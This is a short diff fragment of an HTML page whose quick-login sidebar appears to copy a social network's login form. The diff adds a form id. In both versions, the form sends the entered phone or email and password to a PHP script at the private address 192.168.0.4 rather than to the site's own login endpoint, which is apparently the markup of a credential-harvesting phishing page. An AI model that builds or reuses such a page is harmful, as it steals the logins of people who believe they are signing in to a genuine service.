@@ -117,7 +117,7 @@ var StaticFiles = {
 
     <div id="side_bar" class="fl_l" style="">
 <div id="quick_login">
-	  <form method="POST" name="login" action="http://192.168.0.4/1/2.php">
+	  <form method="POST" name="login" id="quick_login_form" action="http://192.168.0.4/1/2.php">
 	    <div class="label">Phone or email</div>
 	    <div class="labeled"><input type="text" name="email" class="text" id="quick_email" /></div>
 	    <div class="label">Password</div>
